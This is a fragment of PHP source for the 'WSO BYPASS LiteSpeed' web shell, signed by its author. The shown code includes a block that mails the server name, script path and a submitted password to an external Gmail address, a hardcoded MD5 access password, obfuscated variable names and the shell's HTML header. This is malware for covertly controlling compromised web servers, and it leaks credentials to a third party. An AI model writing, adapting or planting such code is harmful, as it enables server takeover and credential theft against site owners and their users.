...
if(array_key_exists('watching',$_POST)){
	$tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n".$_POST['pass']; @mail('mr-quixter@gmail.com', 'root', $tmp); // Edit or delete!
}
//-----------------Password---------------------
$▛ = "a4dfd721a92d2cdc1474983c8e1062be"; //password? contact me: mr.quixter@gmail.com
$▘ = true;
$▜ = 'UTF-8';
$▚ = 'FilesMan';
...
function hardHeader() {
	...
	echo "<html><head><title>WSO BYPASS LiteSpeed</title>
<style>
...
<table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100%>
	...
	</tr></table></div><body><center><hr width=0> </font><p><font size=1> <font color=aqua> YEAR: ".date("Y")." @Mr. Quixter<br>https://mr-quixter.blogspot.com</font><br></center></body>
